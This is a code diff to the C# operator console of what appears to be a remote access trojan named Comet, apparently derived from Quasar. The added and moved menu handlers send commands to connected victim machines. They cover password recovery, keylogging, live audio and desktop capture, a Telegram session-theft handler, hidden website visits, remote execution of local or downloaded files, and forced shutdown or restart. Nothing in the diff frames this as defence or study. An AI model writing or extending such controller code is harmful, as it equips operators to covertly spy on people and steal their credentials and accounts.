@@ -639,26 +639,6 @@ namespace Comet.Server.Forms
 
         #region "Monitoring"
 
-        private void passwordRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            Client[] clients = GetSelectedClients();
-            if (clients.Length > 0)
-            {
-                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
-                frmPass.Show();
-            }
-        }
-
-        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            foreach (Client c in GetSelectedClients())
-            {
-                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
-                frmKl.Show();
-                frmKl.Focus();
-            }
-        }
-
         #endregion
 
         #region "User Support"
@@ -777,7 +757,13 @@ namespace Comet.Server.Forms
 
         private void lstClients_MouseDoubleClick(object sender, MouseEventArgs e)
         {
-            GetWebcams();
+            //GetWebcams();
+            foreach (Client c in GetSelectedClients())
+            {
+                var frmRd = FrmRemoteDesktop.CreateNewOrGetExisting(c);
+                frmRd.Show();
+                frmRd.Focus();
+            }
         }
 
         private void remoteDesktopToolStripMenuItem1_Click(object sender, EventArgs e)
@@ -802,16 +788,6 @@ namespace Comet.Server.Forms
                 FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                 frmFm.Show();
                 frmFm.Focus();
-            }
-        }
-
-        private void passwordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
-        {
-            Client[] clients = GetSelectedClients();
-            if (clients.Length > 0)
-            {
-                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
-                frmPass.Show();
             }
         }
 
@@ -963,6 +939,152 @@ namespace Comet.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
+            }
+        }
+
+        private void passwordRecoveryToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmPasswordRecovery frmPass = new FrmPasswordRecovery(clients);
+                frmPass.Show();
+            }
+        }
+
+        private void remoteAudioToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmAudio frmAd = FrmAudio.CreateNewOrGetExisting(c);
+                frmAd.Show();
+                frmAd.Focus();
+            }
+        }
+
+        public TelegramHandler telegramHandler=null;
+        private void loginTelegramToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lstClients.FocusedItem.Tag is Client client)
+            {
+                client.Send(new Telegram());
+                if (telegramHandler == null)
+                {
+                    telegramHandler = new TelegramHandler();
+                    MessageHandler.Register(telegramHandler);
+                }
+            }
+        }
+
+        private void shutdownToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            if (MessageBox.Show("确实要关闭远程电脑吗？", "关机", MessageBoxButtons.OKCancel, MessageBoxIcon.Question) == DialogResult.OK)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    c.Send(new DoShutdownAction { Action = ShutdownAction.Shutdown });
+                }
+            }
+        }
+
+        private void restartToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            if (MessageBox.Show("确定要重启远程电脑吗？", "重启", MessageBoxButtons.OKCancel, MessageBoxIcon.Question) == DialogResult.OK)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    c.Send(new DoShutdownAction { Action = ShutdownAction.Restart });
+                }
+            }
+        }
+
+        private void standbyToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            if (MessageBox.Show("确定要注销远程电脑吗？", "注销", MessageBoxButtons.OKCancel, MessageBoxIcon.Question) == DialogResult.OK) 
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    c.Send(new DoShutdownAction { Action = ShutdownAction.Standby });
+                }
+            }
+        }
+
+        private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmKeylogger frmKl = FrmKeylogger.CreateNewOrGetExisting(c);
+                frmKl.Show();
+                frmKl.Focus();
+            }
+        }
+
+        private void sendToWebsiteToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new FrmVisitWebsite(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == DialogResult.OK)
+                    {
+                        foreach (Client c in GetSelectedClients())
+                        {
+                            c.Send(new DoVisitWebsite
+                            {
+                                Url = frm.Url,
+                                Hidden = frm.Hidden
+                            });
+                        }
+                    }
+                }
+            }
+        }
+
+        private void showMessageboxToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                using (var frm = new FrmShowMessagebox(lstClients.SelectedItems.Count))
+                {
+                    if (frm.ShowDialog() == DialogResult.OK)
+                    {
+                        foreach (Client c in GetSelectedClients())
+                        {
+                            c.Send(new DoShowMessageBox
+                            {
+                                Caption = frm.MsgBoxCaption,
+                                Text = frm.MsgBoxText,
+                                Button = frm.MsgBoxButton,
+                                Icon = frm.MsgBoxIcon
+                            });
+                        }
+                    }
+                }
+            }
+        }
+
+        private void localFileToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
+            }
+        }
+
+        private void webFileToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            Client[] clients = GetSelectedClients();
+            if (clients.Length > 0)
+            {
+                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
+                frmRe.Show();
             }
         }
     }
